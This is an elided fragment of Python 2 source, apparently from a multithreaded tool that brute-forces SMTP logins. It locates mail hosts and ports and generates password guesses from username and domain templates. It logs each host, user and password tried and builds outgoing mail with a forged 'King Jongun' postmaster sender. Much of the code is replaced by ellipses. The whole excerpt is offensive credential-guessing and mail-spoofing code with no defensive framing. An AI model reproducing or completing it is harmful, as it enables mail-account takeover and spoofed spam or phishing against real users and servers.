...
class consumer(threading.Thread):
	...
	def findHost(self,host):
		...
		try:
			...
			pass
		print '[*] Searching smtp host+port on'+host
		cache[host]=[-1,-1]
	...
	def getPass(self,passw,user,domain):
		...
		if '%null%' in passw:
			...
			user=user.title().replace('-','').replace('.','').replace('_','')
			return passw.replace('%User%',user)
		elif '%domain%' in passw:
			return passw.replace('%domain%',domain.replace("-",""))
		elif '%Domain%' in passw:
			return passw.replace('%Domain%',domain.title().replace("-",""))
	...
	def connect(self,tupple,ssl=False):
		...
		print '[+] Try '+host+":"+port+" "+user+" "+passw
		try:
		...
		#	print rez
			...
			headers='From: "King Jongun" <postmaster@khorasan.ac.ir>\r\n'
			headers+='To: '+email+'\r\n'
